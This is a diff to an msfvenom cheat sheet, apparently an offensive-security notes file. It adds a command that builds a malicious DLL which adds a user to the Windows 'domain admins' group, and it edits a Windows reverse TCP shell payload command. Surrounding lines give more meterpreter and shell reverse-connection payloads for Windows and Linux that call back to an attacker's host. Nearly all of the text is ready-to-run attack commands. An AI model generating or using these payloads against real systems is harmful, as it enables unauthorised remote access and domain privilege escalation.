@@ -9,6 +9,11 @@
 msfvenom --list payloads
 ```
 
+## dll domain admin
+```
+msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll
+```
+
 ## msfvenom - payload windows x86 meterpeter unstagged
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe > shell.exe
@@ -29,9 +34,9 @@ msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=<ip|tun0> LPORT=<port> prep
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
 ```
 
-## Windows Reverse TCP Shell
+## Windows Reverse TCP Shell (nc catch )
 ```
-msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<local> -f exe > shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<local> -f exe > shell.exe
 ```
 
 ## Windows Encoded Meterpreter Windows Reverse Shell
